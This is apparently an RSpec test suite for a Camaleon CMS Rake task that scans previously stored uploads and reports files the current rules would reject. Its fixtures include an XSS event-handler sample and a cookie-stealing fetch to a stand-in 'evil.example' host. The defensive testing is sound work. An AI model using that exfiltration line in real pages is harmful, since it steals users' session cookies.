# frozen_string_literal: true

require 'rake'

# The upload rules apply at upload time, so files stored before them are never re-examined. This
# task is the read-only way an operator sees what is already sitting under the media root.
RSpec.describe 'camaleon_cms:security:scan_uploads Rake task', type: :task do
  before(:all) do # rubocop:disable RSpec/BeforeAfterAll
    Rails.application.load_tasks
  end

  after(:all) do # rubocop:disable RSpec/BeforeAfterAll
    Rake::Task['camaleon_cms:security:scan_uploads'].clear
  end

  let(:task) { Rake::Task['camaleon_cms:security:scan_uploads'] }
  let(:site) { CamaleonCms::Site.first }
  let(:media_root) { Rails.public_path.join('media', site.id.to_s) }

  before do
    task.reenable
    FileUtils.mkdir_p(media_root)
  end

  after { FileUtils.rm_rf(media_root) }

  def store(name, content)
    path = media_root.join(name)
    FileUtils.mkdir_p(File.dirname(path))
    File.binwrite(path, content)
    path
  end

  it 'reports stored markup carrying a handler the old denylist missed' do
    store('legacy.html', %(<div onpointerdown="alert(1)">x</div>))

    expect { task.invoke }.to output(%r{Site #{site.id} /media/#{site.id}/legacy\.html: would be rejected}).to_stdout
  end

  it 'reports a stored script file' do
    store('legacy.js', %(fetch('https://evil.example/c?'+document.cookie)))

    expect { task.invoke }.to output(%r{/media/#{site.id}/legacy\.js: would be rejected}).to_stdout
  end

  it 'reports a file nested in a subfolder' do
    store('assets/deep/legacy.html', %(<div onpointerdown="alert(1)">x</div>))

    expect { task.invoke }.to output(%r{/media/#{site.id}/assets/deep/legacy\.html}).to_stdout
  end

  it 'leaves every reported file present and byte-identical' do
    contents = %(<div onpointerdown="alert(1)">x</div>)
    path = store('legacy.html', contents)

    expect { task.invoke }.to output(/would be rejected/).to_stdout
    expect(File.exist?(path)).to be(true)
    expect(File.binread(path)).to eq(contents)
  end

  it 'says plainly that a finding is not by itself evidence of compromise' do
    store('legacy.js', 'console.log(1)')

    expect { task.invoke }.to output(/not by itself evidence of compromise/).to_stdout
  end

  it 'reports nothing for a media root whose files all pass' do
    store('fine.png', "\x89PNG\r\n\x1a\n")
    store('fine.svg', %(<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>))

    # Matched on the per-file marker, not on "would be rejected" -- the summary line carries that
    # phrase too ("0 would be rejected"), so the looser pattern passes for the wrong reason.
    expect { task.invoke }.not_to output(/✗/).to_stdout
  end

  it 'counts what it scanned even when nothing is flagged' do
    store('fine.png', "\x89PNG\r\n\x1a\n")

    expect { task.invoke }.to output(/1 stored file\(s\) scanned, 0 would be rejected/).to_stdout
  end

  it 'reports a file it cannot read rather than skipping it' do
    store('legacy.html', 'x')
    allow(File).to receive(:binread).and_raise(Errno::EACCES)

    expect { task.invoke }.to output(/would be rejected \(unreadable/).to_stdout
  end

  # A basename that is entirely an extension is what cama_upload_extension fail-closes on, yet a
  # plain glob skips leading-dot names -- so the report omitted its own strictest case.
  it 'reports a dotfile whose whole basename is an extension' do
    store('.js', 'console.log(1)')

    expect { task.invoke }.to output(%r{/media/#{site.id}/\.js: would be rejected}).to_stdout
  end

  context 'with private media stored outside the public root' do
    let(:private_root) { Rails.root.join(CamaleonCmsUploader::PRIVATE_DIRECTORY) }

    before { FileUtils.mkdir_p(private_root) }
    after { FileUtils.rm_f(private_root.join('legacy.js')) }

    # Private uploads are scanned at save time exactly like public ones, so the report must cover
    # them too rather than overstating its coverage by looking only under the public media root.
    it 'reports a flagged private-media file' do
      File.binwrite(private_root.join('legacy.js'), 'console.log(1)')

      expect { task.invoke }.to output(%r{Private media /private/legacy\.js: would be rejected}).to_stdout
    end
  end

  context 'when media_slug_folder stores uploads under media/<slug>' do
    let(:slug_root) { Rails.public_path.join('media', site.slug) }

    before do
      allow(PluginRoutes).to receive(:static_system_info)
        .and_return(PluginRoutes.static_system_info.merge('media_slug_folder' => true))
      FileUtils.mkdir_p(slug_root)
    end

    after { FileUtils.rm_rf(slug_root) }

    # Hardcoding media/<id> found nothing on a slug-configured install and printed a false all-clear.
    it 'scans the slug-named directory, not media/<id>' do
      File.binwrite(slug_root.join('legacy.js'), 'console.log(1)')

      expect { task.invoke }.to output(%r{/media/#{site.slug}/legacy\.js: would be rejected}).to_stdout
    end
  end
end
